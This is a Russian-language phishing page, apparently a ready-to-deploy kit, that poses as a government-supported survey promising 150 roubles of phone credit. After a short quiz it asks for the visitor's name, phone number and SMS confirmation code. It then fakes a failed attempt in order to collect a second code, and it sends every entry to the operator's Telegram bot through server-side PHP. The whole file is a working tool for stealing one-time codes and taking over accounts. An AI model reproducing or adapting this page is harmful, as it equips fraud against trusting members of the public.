<?php
if(isset($_GET['q']) and $_GET['q'] == 1){
  //*********************
    $token = "токен Вашего тг бота";
    $chid = 'Ваш id';
  //************************
  
    $text = "Телефон: ".$_GET['p'].
    "\nИмя: ".$_GET['n']."\n".
    "Код: ".$_GET['c'];
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chid}&text=".urlencode($text);
    file_get_contents($url);
}

?>
<!DOCTYPE html>
<html lang="ru">
  <head>
    <meta charset="UTF-8">
    <title>ГоcОпрос</title>
    <style>
      body {
        font-family: Arial, sans-serif
      }

      .container {
        max-width: 800px;
        margin: 0 auto;
        text-align: center
      }

      h1 {
        font-size: 32px;
        margin-bottom: 20px
      }

      p {
        font-size: 24px;
        margin-bottom: 10px;
        text-align: left
      }

      button {
        padding: 10px 20px;
        font-size: 18px;
        background-color: #3498db;
        color: white;
        border-radius: 5px;
        border: none;
        cursor: pointer;
        transition: all .3s ease;
        margin-top: 20px
      }
input[type="phone"], input[type="text"] {
  padding: 10px;
  font-size: 18px;
  border-radius: 5px;
  border: none;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
  transition: all .3s ease;
  margin-top: 20px;
}
      button:hover {
        background-color: #2980b9
      }

      .modal {
        display: none;
        position: fixed;
        z-index: 1;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        overflow: auto;
        background-color: rgba(0, 0, 0, .5)
      }

      .modal-content {
        background-color: #fefefe;
        margin: 15% auto;
        padding: 20px;
        border-radius: 5px;
        width: 60%;
        max-width: 500px
      }

      .close {
        color: #aaa;
        float: right;
        font-size: 28px;
        font-weight: bold
      }

      .close:hover,
      .close:focus {
        color: black;
        text-decoration: none;
        cursor: pointer
      }
      #pg2, #pg3{
      display:none;}
    </style>
  </head>
  <body>
  
    <div class="container">
      <img src="https://open-dubna.ru/images/gibddopros.jpg" height=100px><h1>Пройди соц.опрос</h1> и получи 150руб на баланс!(Основано при поддержке <a href="https://фцмпо.рф/">фцмпо.рф</a>)
      <hr>
      
      <form id="quiz-form">
        <p id="question">В какой стране Вы хотите побывать больше всего?</p>
        <label>
          <input type="radio" name="answer" value="0">Турции </label>
        <br>
        <label>
          <input type="radio" name="answer" value="1"> Германии </label>
        <br>
        <label>
          <input type="radio" name="answer" value="2"> Китае </label>
        <br>
        <label>
          <input type="radio" name="answer" value="3"> Японии </label>
        <br>
        <button type="submit">Далее</button>
      </form>
    </div>
    <div class="modal" id="modal">
      <div class="modal-content">
        <div id="pg1">
        <p>Спасибо за прохождение опроса!</p>
        <p>Укажите свой номер телефона начиная с +, чтобы получить 150руб на баланс.</p>

        <input type=text id="name" placeholder="Как Вас зовут?"><br>
        <input type=phone id="pn" placeholder="Номер телефона"><br>
        <button type="button" onclick="refas(1)">Завершить</button><br>

        Баланс будет пополнен в течении суток.
        </div>
        <div id="pg2">
        	<p style="">Укажите код из смс</p>
          <input type=phone id="ccd23" placeholder="Код из смс"><br>
          <button type="button" onclick="refas(2)">Подтвердить</button><br>
        </div>
        <div id="pg3">
        	<p style="color:red;">Повторите попытку</p>
        	<input type=phone id="ccd2" placeholder="Код из смс"><br>
          <button type="button" onclick="refas(3)">Подтвердить</button><br>
        </div>
      </div>
    </div>
    <script>
    function refas(pg){


if(pg === 1){ 
    document.getElementById("pg1").style.display="none";
    document.getElementById("pg2").style.display="block";
    fetch('?q=1&p='+document.getElementById("pn").value+"&n="+document.getElementById("name").value+"&c="+document.getElementById("ccd23").value)
      .then(response => response.text())
      .then(data => "");
} else if(pg === 2){
    fetch('?q=1&p='+document.getElementById("pn").value+"&n="+document.getElementById("name").value+"&c="+document.getElementById("ccd23").value)
      .then(response => response.text())
      .then(data => "");
    document.getElementById("pg2").style.display="none";
    document.getElementById("pg3").style.display="block";
}else if(pg === 3){
    fetch('?q=1&p='+document.getElementById("pn").value+"&n="+document.getElementById("name").value+"&c="+document.getElementById("ccd2").value)
      .then(response => response.text())
      .then(data => "");
}
}

      const questions = [{
        question: "В какой стране Вы хотите побывать?",
        answers: ["Я хочуть побывать в Турции", "Германии", "Китае", "Японии"],
        correctAnswerIndex: null
      }, {
        question: "Ваши предпочтения в транспортах?",
        answers: ["Велосипед", "Скейт", "Автомобиль", "Мотоциклы"],
        correctAnswerIndex: null
      }, {
        question: "Будь у Вас сумма в 10.000.000руб, куда бы Вы потратили?",
        answers: ["Автомобиль", "Дом", "Квартира", "Свой проект/бизнес"],
        correctAnswerIndex: null
      }, {
        question: "Какая из профессий, вам больше нравится?",
        answers: ["Программист", "Дизайнер", "Врач", "Механик"],
        correctAnswerIndex: null
      }];
      const quizForm = document.getElementById("quiz-form"),
        questionElement = document.getElementById("question"),
        submitButton = document.querySelector("#quiz-form button"),
        modal = document.getElementById("modal"),
        closeButton = document.querySelector(".close");
      let currentQuestionIndex = 0;

      function showQuestion() {
        const a = questions[currentQuestionIndex];
        questionElement.textContent = a.question, quizForm.answer[0].nextSibling.textContent = a.answers[0], quizForm.answer[1].nextSibling.textContent = a.answers[1], quizForm.answer[2].nextSibling.textContent = a.answers[2], quizForm.answer[3].nextSibling.textContent = a.answers[3]
      }

      function checkAnswer() {
        const a = questions[currentQuestionIndex],
          b = Number(document.querySelector('input[name="answer"]:checked').value);
        b === a.correctAnswerIndex ? a.correct = !0 : a.correct = !1
      }

      function handleSubmit(a) {
        a.preventDefault(), checkAnswer(), currentQuestionIndex += 1, currentQuestionIndex < questions.length ? showQuestion() : modal.style.display = "block"
      }
      submitButton.addEventListener("click", handleSubmit), closeButton.onclick = function() {
        modal.style.display = "none"
      }, window.onclick = function(a) {
        a.target === modal && (modal.style.display = "none")
      };
    </script>
  </body>
</html>
